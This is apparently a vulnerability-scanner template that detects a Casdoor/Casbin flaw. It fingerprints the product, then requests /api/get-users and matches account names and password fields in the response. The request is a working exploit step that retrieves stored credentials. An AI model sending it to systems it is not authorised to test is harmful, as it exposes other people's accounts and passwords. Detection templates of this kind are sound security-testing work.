id: poc-yaml-casbin-get-users-user-password-leak
info:
  name: Casbin get-users Account Password Leak
  author: ProjectDiscoveryAI
  severity: medium
  tags: info-leak
http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Casdoor"
  - raw:
      - |
        GET /api/get-users?p=123&pageSize=123 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "\"name\"\x3a \"([0-9a-zA-Z]+)\""
          - "\"password\"\x3a \"([0-9a-zA-Z/]+)\""
      - type: word
        part: header
        words:
          - "application/json"
